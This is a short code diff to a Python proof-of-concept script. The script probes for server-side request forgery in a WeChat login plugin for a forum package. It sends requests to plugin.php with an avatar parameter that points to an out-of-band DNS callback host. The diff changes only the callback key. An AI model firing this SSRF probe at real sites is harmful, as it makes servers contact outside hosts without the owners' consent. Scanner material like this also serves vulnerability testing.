@@ -28,7 +28,7 @@ class POC(Script):
             ]))
             async with ClientSession() as session:
                 for path in path_list:
-                    dns = self.ceye_dns_api(t='url')
+                    dns = self.ceye_dns_api(k='dsz34ssrf',t='url')
                     url = path + "plugin.php?id=wechat:wechat&ac=wxregister&username=vov&avatar=%s&wxopenid=%s" %(dns,''.join([random.choice(ascii_lowercase) for _ in range(8)]))
                     async with session.get(url=url) as res:
                         if res != None :
